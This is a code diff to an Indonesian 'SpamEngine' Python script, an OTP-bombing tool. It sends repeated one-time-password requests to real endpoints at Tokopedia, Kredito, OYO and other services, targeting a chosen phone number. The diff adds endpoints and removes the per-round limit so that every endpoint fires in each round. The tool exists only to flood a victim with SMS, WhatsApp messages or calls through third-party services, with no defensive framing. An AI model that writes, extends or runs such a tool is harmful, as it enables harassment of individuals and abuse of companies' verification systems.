@@ -1,4 +1,3 @@
-cat > spam_engine.py << 'EOF'
 #!/usr/bin/env python3
 import requests
 import json
@@ -16,7 +15,6 @@ class SpamEngine:
         })
     
     def load_endpoints(self):
-        """60+ endpoint dari file asli"""
         return {
             'tokopedia': {
                 'url': 'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
@@ -38,21 +36,24 @@ class SpamEngine:
                 'method': 'POST',
                 'payload': lambda n: {'phone': '0' + n[1:]}
             },
-            'gojek_call': {
-                'url': 'https://api.grab.com/grabid/v1/phone/otp',
+            'kredito': {
+                'url': 'https://app-api.kredito.id/client/v1/common/verify-code/send',
                 'method': 'POST',
-                'payload': lambda n: {'method': 'CALL', 'countryCode': 'id', 'phoneNumber': n}
+                'payload': lambda n: {'mobilePhone': n}
             },
-            # Add 55+ lebih dari file asli...
+            'oyo': {
+                'url': 'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone',
+                'method': 'POST',
+                'payload': lambda n: {'phone': n, 'country_code': '+62'}
+            },
         }
     
     def spam_termux(self, nomor, jumlah, callback=None):
-        """Execute spam di Termux"""
         success = 0
         failed = 0
         
         for round_num in range(jumlah):
-            for endpoint_name, endpoint in list(self.endpoints.items())[:10]:  # Limit 10 endpoint per round
+            for endpoint_name, endpoint in self.endpoints.items():
                 try:
                     if endpoint['method'] == 'POST':
                         resp = self.session.post(
@@ -82,17 +83,14 @@ class SpamEngine:
                     if callback:
                         callback(f"[✗] {endpoint_name}")
             
-            # Rate limit
             if round_num < jumlah - 1:
                 time.sleep(random.uniform(2, 4))
         
-        # Save history
         self.save_history(nomor, jumlah, success)
         
         return {'success': success, 'failed': failed}
     
     def save_history(self, nomor, jumlah, success):
-        """Save ke history.json"""
         os.makedirs('logs', exist_ok=True)
         
         try:
@@ -109,5 +107,4 @@ class SpamEngine:
         })
         
         with open('logs/history.json', 'w') as f:
-            json.dump(history[-100:], f, indent=2)  # Keep last 100
-EOF
+            json.dump(history[-100:], f, indent=2)
